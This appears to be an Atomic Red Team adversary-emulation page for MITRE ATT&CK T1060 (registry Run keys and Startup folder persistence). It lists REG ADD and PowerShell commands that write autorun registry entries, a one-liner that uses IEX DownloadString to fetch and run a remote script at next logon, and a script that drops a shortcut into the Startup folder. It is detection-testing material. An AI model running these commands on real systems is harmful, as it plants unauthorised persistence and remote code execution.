# Registry Run Keys / Start Folder

## MITRE ATT&CK Technique:
[T1060](https://attack.mitre.org/wiki/Technique/T1060)

## Reg Add 1

    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"


## Reg Add 2

    REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"

## PowerShell

    $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    set-itemproperty $RunOnceKey "NextRun" 'C:\Windows\System32\WindowsPowerShell\v1.0\Powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat`")"'

## Oneliner:

    set-itemproperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" "NextRun" 'C:\Windows\System32\WindowsPowerShell\v1.0\Powershell.exe "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat`")"'

## Startup Folder

### Single User:

    C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

### All Users:

    C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

### Add .lnk file to startup with PowerShell:

    $TargetFile = "$env:SystemRoot\System32\notepad.exe"
    $ShortcutFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk"
    $WScriptShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
    $Shortcut.TargetPath = $TargetFile
    $Shortcut.Save()
